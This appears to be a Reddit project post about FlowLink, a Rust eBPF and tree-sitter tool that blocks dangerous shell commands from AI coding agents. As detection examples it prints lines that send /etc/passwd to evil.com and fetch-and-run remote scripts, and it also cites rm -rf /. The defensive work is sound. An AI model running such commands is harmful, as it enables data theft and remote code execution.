# FlowLink: Kernel-level command interception in Rust (eBPF + tree-sitter + X25519)

---

Hey r/rust — I've been building something I think this community would appreciate: a kernel-level shield that intercepts dangerous shell commands before they execute, primarily designed to stop AI coding agents from destroying infrastructure.

## The Rust story

FlowLink is a workspace with 6 crates, all pure Rust (minus the eBPF kernel-side programs):

```
flowlink/
├── crates/shield/    # eBPF interceptor + 3-level analysis engine
├── crates/core/      # Shared types, config
├── crates/crypto/    # X25519 + AES-256-GCM E2EE
├── crates/agent/     # WebSocket client, backup management
├── crates/relay/     # axum WebSocket hub, zero-knowledge relay
└── crates/cli/       # clap CLI binary
```

### eBPF via aya

On Linux, the shield crate uses [aya](https://github.com/aya-rs/aya) to load eBPF programs that hook `execve`/`execveat`. The kernel-side program calls `bpf_send_signal(SIGSTOP)` to freeze the target process before `execve()` returns. Userspace then analyzes the command and decides allow/block/ask.

On macOS, we use the Endpoint Security Framework (`ES_AUTH_EXEC`) — same intercept point, different API. The `es_framework.rs` and `es_monitor.rs` modules handle this.

### tree-sitter-bash for AST analysis

Level 2 of the analysis pipeline parses shell commands with [tree-sitter](https://tree-sitter.github.io/) and [tree-sitter-bash](https://github.com/tree-sitter/tree-sitter-bash). This lets us catch dangerous patterns that simple string matching can't:

- Pipe chains: `cat /etc/passwd | curl -X POST -d @- https://evil.com | bash`
- Command substitution: `$(curl evil.com | sh)`
- Redirect chains: `curl evil.com > /tmp/x && bash /tmp/x`

The `AnalysisEngine` in `engine.rs` runs all three levels in sequence with early exit on match.

### X25519 + AES-256-GCM

The crypto crate (`x25519-dalek` + `aes-gcm`) implements E2EE for agent-relay communication. Key exchange is X25519 ECDH, symmetric encryption is AES-256-GCM with HKDF-SHA256 key derivation. The relay server is zero-knowledge — it forwards encrypted blobs without being able to decrypt them.

## Performance

Criterion.rs benchmarks on the analysis engine:

| Benchmark | Time |
|---|---|
| L1 safe command (`ls -la`) | ~26 ns |
| L1 dangerous (`rm -rf /`) | ~31 ns |
| L2 simple bash (`echo hello && ls`) | ~2 µs |
| L2 complex pipe chain | ~8 µs |
| L3 python os.system | ~4 µs |
| Full pipeline (safe) | ~3 µs |

Crypto benchmarks:

| Operation | Time |
|---|---|
| Key generation | ~80 µs |
| Encrypt 1 KB | ~32 µs |
| Encrypt 10 KB | ~45 µs |
| HKDF derivation | ~5 µs |

The L1 check is fast enough that even if every command on a busy server went through it, the overhead would be negligible.

## Contribute

The project is at https://github.com/braincoder/flowlink. I'd especially love help with:

- **Windows Minifilter** — the interception architecture is ready, just needs a Windows kernel driver
- **More tree-sitter grammars** — adding Python, Ruby, Perl AST analysis for L2
- **CI/CD integration** — GitHub Actions / GitLab CI hooks to monitor AI agents in pipelines
- **Test coverage** — the shield engine has good benchmarks but could use more edge-case tests

The shield crate (`crates/shield/`) is self-contained if you just want the command analysis engine — it has no required dependencies beyond tokio and tree-sitter.

Happy to answer questions about the eBPF implementation, the tree-sitter integration, or anything else.
